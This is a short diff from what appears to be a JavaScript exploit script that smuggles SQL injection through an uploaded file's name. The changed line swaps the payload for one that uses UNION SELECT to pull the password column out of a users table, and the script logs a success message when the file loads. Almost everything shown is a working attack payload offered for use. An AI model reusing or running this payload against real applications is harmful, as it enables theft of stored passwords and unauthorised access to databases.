@@ -19,4 +19,4 @@ function setPayload(payloadName) {
     console.log(`[+] Successfully loaded payload: ${fileInput.files[0].name}`);
 }
 
-setPayload("' UNION SELECT original_name FROM files LIMIT 1 OFFSET 3 -- .png");
+setPayload("' UNION SELECT password FROM users LIMIT 1 OFFSET 0 -- .png");
